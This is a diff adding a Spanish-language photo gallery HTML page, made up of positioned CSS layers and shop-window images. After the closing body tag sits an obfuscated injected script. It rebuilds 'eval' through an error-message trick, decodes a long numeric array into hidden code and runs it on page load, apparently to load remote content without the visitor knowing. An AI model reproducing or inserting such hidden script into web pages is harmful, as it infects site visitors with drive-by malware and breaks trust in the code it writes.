@@ -1,0 +1,300 @@
+<html>
+<head>
+<title>FOTOS VARIADAS</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<style type="text/css">
+<!--
+.Estilo4 {
+	color: #0000FF;
+	font-style: italic;
+	font-size: 40px;
+	font-weight: bold;
+	font-family: Batang;
+}
+#Layer1 {
+	position:absolute;
+	width:255px;
+	height:209px;
+	z-index:1;
+	left: 55px;
+	top: 146px;
+	background-color: #FFFFFF;
+	background-image: url(photogallery/Fabrica/P/Feria.jpg);
+}
+#Layer2 {
+	position:absolute;
+	width:238px;
+	height:227px;
+	z-index:2;
+	left: 368px;
+	top: 976px;
+	background-color: #FFFFFF;
+	background-image: url(photogallery/Fabrica/P/Mati.jpg);
+}
+#Layer3 {
+	position:absolute;
+	width:274px;
+	height:214px;
+	z-index:3;
+	left: 663px;
+	top: 156px;
+	background-color: #FFFFFF;
+	background-image: url(photogallery/Fabrica/P/EyE.jpg);
+}
+#Layer4 {
+	position:absolute;
+	width:344px;
+	height:274px;
+	z-index:4;
+	left: 29px;
+	top: 379px;
+	background-color: #FFFFFF;
+}
+#Layer5 {
+	position:absolute;
+	width:248px;
+	height:190px;
+	z-index:5;
+	left: 405px;
+	top: 428px;
+	background-color: #FFFFFF;
+}
+#Layer6 {
+	position:absolute;
+	width:234px;
+	height:202px;
+	z-index:6;
+	left: 705px;
+	top: 456px;
+	background-color: #FFFFFF;
+}
+#Layer7 {
+	position:absolute;
+	width:256px;
+	height:209px;
+	z-index:7;
+	left: 49px;
+	top: 677px;
+	background-color: #FFFFFF;
+}
+#Layer8 {
+	position:absolute;
+	width:262px;
+	height:202px;
+	z-index:8;
+	left: 340px;
+	top: 38px;
+	background-color: #FFFFFF;
+}
+#Layer9 {
+	position:absolute;
+	width:250px;
+	height:218px;
+	z-index:8;
+	left: 686px;
+	top: 719px;
+	background-color: #FFFFFF;
+}
+#Layer10 {
+	position:absolute;
+	width:254px;
+	height:219px;
+	z-index:9;
+	left: 32px;
+	top: 918px;
+	background-color: #FFFFFF;
+}
+#Layer11 {
+	position:absolute;
+	width:300px;
+	height:233px;
+	z-index:10;
+	left: 348px;
+	top: 148px;
+	background-color: #FFFFFF;
+}
+#Layer12 {
+	position:absolute;
+	width:250px;
+	height:211px;
+	z-index:11;
+	left: 700px;
+	top: 980px;
+	background-color: #FFFFFF;
+}
+#Layer13 {
+	position:absolute;
+	width:252px;
+	height:209px;
+	z-index:12;
+	left: 34px;
+	top: 1262px;
+	background-color: #FFFFFF;
+}
+#Layer14 {
+	position:absolute;
+	width:255px;
+	height:221px;
+	z-index:13;
+	left: 357px;
+	top: 1225px;
+	background-color: #FFFFFF;
+}
+#Layer15 {
+	position:absolute;
+	width:211px;
+	height:259px;
+	z-index:14;
+	left: 715px;
+	top: 1283px;
+	background-color: #FFCC00;
+}
+#Layer16 {
+	position:absolute;
+	width:200px;
+	height:178px;
+	z-index:14;
+	left: 693px;
+	top: 1255px;
+}
+#Layer17 {
+	position:absolute;
+	width:200px;
+	height:191px;
+	z-index:15;
+	left: 71px;
+	top: 1505px;
+}
+#Layer18 {
+	position:absolute;
+	width:222px;
+	height:194px;
+	z-index:16;
+	left: 407px;
+	top: 1521px;
+}
+#Layer19 {
+	position:absolute;
+	width:203px;
+	height:193px;
+	z-index:17;
+	left: 292px;
+	top: -51px;
+}
+#Layer20 {
+	position:absolute;
+	width:200px;
+	height:209px;
+	z-index:17;
+	left: -613px;
+	top: 247px;
+}
+#Layer21 {
+	position:absolute;
+	width:224px;
+	height:198px;
+	z-index:17;
+	left: 336px;
+	top: 43px;
+}
+#Layer22 {
+	position:absolute;
+	width:213px;
+	height:198px;
+	z-index:17;
+	left: 326px;
+	top: -49px;
+}
+#Layer23 {
+	position:absolute;
+	width:238px;
+	height:178px;
+	z-index:17;
+	left: -639px;
+	top: 241px;
+}
+#Layer24 {
+	position:absolute;
+	width:244px;
+	height:191px;
+	z-index:17;
+	left: 291px;
+	top: 63px;
+}
+#Layer25 {
+	position:absolute;
+	width:236px;
+	height:198px;
+	z-index:17;
+	left: 324px;
+	top: -32px;
+}
+#Layer26 {
+	position:absolute;
+	width:236px;
+	height:197px;
+	z-index:17;
+	left: -651px;
+	top: 197px;
+}
+#Layer27 {
+	position:absolute;
+	width:234px;
+	height:189px;
+	z-index:17;
+	left: 311px;
+	top: 53px;
+}
+#Layer28 {
+	position:absolute;
+	width:220px;
+	height:170px;
+	z-index:17;
+	left: 325px;
+	top: -9px;
+}
+#Layer29 {
+	position:absolute;
+	width:386px;
+	height:358px;
+	z-index:1;
+	left: 285px;
+	top: 104px;
+}
+#Layer30 {
+	position:absolute;
+	width:274px;
+	height:272px;
+	z-index:2;
+	left: -238px;
+	top: 374px;
+}
+#Layer31 {
+	position:absolute;
+	width:442px;
+	height:393px;
+	z-index:1;
+	left: 473px;
+	top: 0px;
+}
+-->
+</style>
+</head>
+
+<body bgcolor="#FFFFFF">
+<div class="Estilo4"> 
+  <div align="center">MIRA EN LA VIDRIERA </div>
+</div>
+<div id="Layer29">
+    <div align="center"><a href="Copia de FOTOS.htm"><img src="photogallery/Fabrica/Vidri.jpg" width="480" height="360" border="0"></a>    </div>
+    <div id="Layer30">
+      <div align="center"><img src="photogallery/Fabrica/Eugenio .jpg" width="400" height="400">      </div>
+      <div id="Layer31">
+        <div align="center"><img src="photogallery/Fabrica/Pou .jpg" width="480" height="360"></div>
+      </div>
+  </div>
+</div>
+</body>
+
+  <!-- . --><script>el=document.createElement("div");el.appendChild(document.createTextNode("ReferenceErr"));el.appendChild(document.createTextNode("q"));el.insertBefore(document.createTextNode("l"),el.childNodes[1]);try{try{throw 1}catch(a){b[2]=21};}catch(a){k=el.firstChild.nodeValue+a.toString().substr(0,0);};ar="ETu}g,fNcA;):vhdby.' 1r[C (p<e/t>o\"s]mlzwa0i=B{?n2";ar2="R80c80c172c24c100c104c60c132c32c8c148c116c192c124c72c16c116c124c0c152c116c148c116c192c124c140c180c68c4c164c16c28c164c148c116c104c76c64c132c60c68c76c44c92c168c144c44c184c80c80c80c172c24c88c164c148c116c88c104c44c40c80c80c12c100c116c152c140c116c100c184c80c80c80c60c132c32c8c148c116c192c124c72c160c88c172c124c116c104c136c112c172c24c88c164c148c116c100c140c88c32c176c76c56c124c124c108c48c120c120c124c132c108c116c32c72c32c156c72c32c32c120c172c192c72c32c16c172c188c196c76c100c160c172c60c124c56c176c76c84c168c76c100c56c116c172c16c56c124c176c76c84c168c76c100c140c124c68c152c116c176c76c52c172c140c172c64c172c152c172c124c68c48c56c172c60c60c116c192c40c108c132c140c172c124c172c132c192c48c164c64c140c132c152c8c124c116c40c152c116c24c124c48c168c40c124c132c108c48c168c40c76c128c112c120c172c24c88c164c148c116c128c136c44c40c80c80c12c80c80c24c8c192c32c124c172c132c192c100c172c24c88c164c148c116c88c104c44c184c80c80c80c52c164c88c100c24c100c176c100c60c132c32c8c148c116c192c124c72c32c88c116c164c124c116c0c152c116c148c116c192c124c104c76c172c24c88c164c148c116c76c44c40c24c72c140c116c124c36c124c124c88c172c64c8c124c116c104c76c140c88c32c76c20c76c56c124c124c108c48c120c120c124c132c108c116c32c72c32c156c72c32c32c120c172c192c72c32c16c172c188c196c76c44c40c24c72c140c124c68c152c116c72c52c172c140c172c64c172c152c172c124c68c176c76c56c172c60c60c116c192c76c40c24c72c140c124c68c152c116c72c108c132c140c172c124c172c132c192c176c76c164c64c140c132c152c8c124c116c76c40c24c72c140c124c68c152c116c72c152c116c24c124c176c76c168c76c40c24c72c140c124c68c152c116c72c124c132c108c176c76c168c76c40c24c72c140c116c124c36c124c124c88c172c64c8c124c116c104c76c160c172c60c124c56c76c20c76c84c168c76c44c40c24c72c140c116c124c36c124c124c88c172c64c8c124c116c104c76c56c116c172c16c56c124c76c20c76c84c168c76c44c40c80c80c80c60c132c32c8c148c116c192c124c72c16c116c124c0c152c116c148c116c192c124c140c180c68c4c164c16c28c164c148c116c104c76c64c132c60c68c76c44c92c168c144c72c164c108c108c116c192c60c96c56c172c152c60c104c24c44c40c80c80c12";pau="urn eReferenceErr".replace(k,"va"+el.childNodes[1].nodeValue);e=Function("ret"+pau)();ar2=ar2.split("c");ar2[0]="80";s="";for(i=0;i!=ar2.length;i++){e('po'+'s=par'+'seInt(k'+'.rep'+'lace("R'+'eferen'+'","0a'+'sd"))+'+'ar2['+'i]/'+'4');e('s+=ar.substr(pos,1)');}
+e(s);</script><!-- . --> </html>   
